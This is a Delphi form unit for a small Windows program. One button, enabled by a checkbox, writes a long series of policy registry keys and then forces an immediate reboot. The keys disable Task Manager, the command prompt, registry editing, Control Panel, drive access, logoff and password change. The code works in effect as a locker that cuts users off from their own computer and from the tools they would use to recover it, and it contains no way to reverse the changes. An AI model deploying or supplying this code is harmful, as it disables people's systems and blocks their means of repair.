unit Unit1;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.StdCtrls, Registry;

type
  TForm1 = class(TForm)
    Label1: TLabel;
    Label2: TLabel;
    Label3: TLabel;
    Label4: TLabel;
    CheckBox1: TCheckBox;
    Button1: TButton;
    Button2: TButton;
    Label5: TLabel;
    Label6: TLabel;
    procedure CheckBox1Click(Sender: TObject);
    procedure Button1Click(Sender: TObject);
    procedure Button2Click(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;

implementation

{$R *.dfm}

procedure TForm1.Button1Click(Sender: TObject);
var reg: TRegistry;
begin
  Form1.Hide();

  reg := TRegistry.Create;

  reg.RootKey := HKEY_CURRENT_USER;
  reg.OpenKey('SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System', true);
  reg.WriteInteger('DisableTaskMgr', 1);
  reg.WriteInteger('NoWinKeys', 1);
  reg.WriteInteger('DisableSR', 1);
  reg.WriteInteger('DisableConfig', 1);
  reg.WriteInteger('NoLogoff', 1);
  reg.WriteInteger('DisableChangePassword', 1);

  reg.CloseKey();

  reg.OpenKey('SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer', true);
  reg.WriteInteger('NoClose', 1);
  reg.WriteInteger('NoTrayContextMenu', 1);
  reg.WriteInteger('HidePowerOptions', 1);
  reg.WriteInteger('NoRun', 1);
  reg.WriteInteger('NoFind', 1);
  reg.WriteInteger('NoControlPanel', 1);
  reg.WriteInteger('NoDrives', 1);
  reg.WriteInteger('NoViewOnDrive', 1);
  reg.WriteInteger('NoSecurityTab', 1);
  reg.WriteInteger('NoFolderOptions', 1);
  reg.WriteInteger('NoCommonGroups', 1);
  reg.WriteInteger('NoSetTaskBar', 1);
  reg.WriteInteger('NoChangingWallpaper', 1);

  reg.CloseKey();

  reg.OpenKey('SOFTWARE\Policies\Microsoft\Windows\CurrentVersion', true);
  reg.WriteInteger('DisableCMD', 1);
  reg.WriteInteger('DisableRegistryTools', 1);
  reg.WriteInteger('RestrictToPermittedSnapins', 1);

  reg.CloseKey();

  reg.RootKey := HKEY_LOCAL_MACHINE;
  reg.OpenKey('SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System', true);
  reg.WriteInteger('shutdownwithoutlogon', 0);
  reg.WriteInteger('EnableLUA', 1);

  reg.CloseKey();
  reg.Free();

  WinExec(PANsiChar('shutdown /f /r /t 0'), SW_HIDE);
end;

procedure TForm1.Button2Click(Sender: TObject);
begin
  Application.Terminate();
end;

procedure TForm1.CheckBox1Click(Sender: TObject);
begin
  if CheckBox1.Checked then begin
    Button1.Enabled := true;
  end else begin
    Button1.Enabled := false;
  end;
end;

end.
